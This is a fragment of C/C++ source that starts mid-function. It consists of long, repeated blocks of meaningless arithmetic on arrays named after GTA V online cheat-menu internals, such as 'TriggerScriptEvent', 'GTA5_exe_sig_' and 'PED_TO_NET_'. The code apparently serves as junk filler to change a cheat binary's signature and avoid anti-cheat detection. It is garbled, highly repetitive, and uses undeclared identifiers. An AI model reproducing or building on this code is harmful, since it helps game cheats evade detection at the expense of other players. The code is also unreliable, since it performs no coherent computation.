					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
